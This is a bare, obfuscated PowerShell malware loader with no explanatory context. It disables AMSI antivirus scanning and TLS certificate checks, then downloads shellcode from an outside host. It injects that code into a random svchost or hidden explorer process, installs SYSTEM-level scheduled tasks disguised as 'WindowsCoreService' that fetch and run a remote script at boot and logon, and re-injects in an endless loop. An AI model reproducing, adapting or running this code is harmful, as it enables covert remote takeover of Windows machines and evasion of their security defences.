$a='Ams';$b='iUti';$c='ls';$d=[Ref].Assembly.GetType("System.Management.Automation.$a$b$c");$e=$d.GetField('amsiInitFailed','NonPublic,Static');$e.SetValue($null,$true);[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$sc=Invoke-RestMethod -Uri 'https://www.hateyouroot.site/payload_shc.bin' -Method Get;$proc=Get-Process svchost -ea SilentlyContinue|Get-Random;if(!$proc){$proc=Start-Process explorer -WindowStyle Hidden -PassThru};$h=([AppDomain]::CurrentDomain.GetAssemblies()|Where{$_.GlobalAssemblyCache -eq $false}|%{$_.GetType('System.Runtime.InteropServices.NativeMethods')})[0]::GetMethod('OpenProcess').Invoke($null,@(0x1F0FFF,$false,$proc.Id));$addr=([AppDomain]::CurrentDomain.GetAssemblies()|Where{$_.GlobalAssemblyCache -eq $false}|%{$_.GetType('System.Runtime.InteropServices.NativeMethods')})[0]::GetMethod('VirtualAllocEx').Invoke($null,@($h,0,$sc.Length,0x3000,0x40));[Runtime.InteropServices.Marshal]::Copy($sc,0,$addr,$sc.Length);$thread=([AppDomain]::CurrentDomain.GetAssemblies()|Where{$_.GlobalAssemblyCache -eq $false}|%{$_.GetType('System.Runtime.InteropServices.NativeMethods')})[0]::GetMethod('CreateRemoteThread').Invoke($null,@($h,0,0,$addr,0,0,0));$t='powershell -w hidden -ep bypass -c \"IEX(Invoke-RestMethod ''https://www.hateyouroot.site/persist.txt'')\"';schtasks /create /tn WindowsCoreService /tr $t /sc onstart /ru SYSTEM /f 2>$null;schtasks /create /tn WindowsCoreService /tr $t /sc onlogon /ru SYSTEM /f 2>$null;while($true){Start-Sleep 300;try{$thread=([AppDomain]::CurrentDomain.GetAssemblies()|Where{$_.GlobalAssemblyCache -eq $false}|%{$_.GetType('System.Runtime.InteropServices.NativeMethods')})[0]::GetMethod('CreateRemoteThread').Invoke($null,@($h,0,0,$addr,0,0,0))}catch{}}
